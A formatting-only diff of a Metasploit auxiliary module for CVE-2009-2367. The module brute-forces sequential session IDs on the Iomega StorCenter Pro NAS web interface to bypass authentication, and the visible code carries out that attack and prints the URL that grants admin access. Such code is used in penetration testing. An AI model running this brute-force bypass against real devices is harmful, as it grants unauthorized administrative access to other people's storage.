@@ -8,25 +8,25 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Iomega StorCenter Pro NAS Web Authentication Bypass',
+      'Name' => 'Iomega StorCenter Pro NAS Web Authentication Bypass',
       'Description' => %q{
         The Iomega StorCenter Pro Network Attached Storage device web interface increments sessions IDs,
         allowing for simple brute force attacks to bypass authentication and gain administrative
         access.
         },
-      'References'  =>
-        [
-          [ 'OSVDB', '55586' ],
-          [ 'CVE', '2009-2367' ],
-        ],
-      'Author'      => [ 'aushack' ],
-      'License'     => MSF_LICENSE
+      'References' => [
+        [ 'OSVDB', '55586' ],
+        [ 'CVE', '2009-2367' ],
+      ],
+      'Author' => [ 'aushack' ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         OptInt.new('SID_MAX', [true, 'Maximum Session ID', 100])
-      ])
+      ]
+    )
   end
 
   def run
@@ -35,8 +35,8 @@ class MetasploitModule < Msf::Auxiliary
         print_status("Trying session ID #{x.to_s}")
 
         res = send_request_raw({
-          'uri'     => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
-          'method'  => 'GET'
+          'uri' => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
+          'method' => 'GET'
         }, 25)
 
         if (res and res.to_s =~ /Log out/)
@@ -44,7 +44,6 @@ class MetasploitModule < Msf::Auxiliary
           print_status("Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x.to_s}")
           break
         end
-
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
         print_error("Unable to connect to #{rhost}:#{rport}")
         break
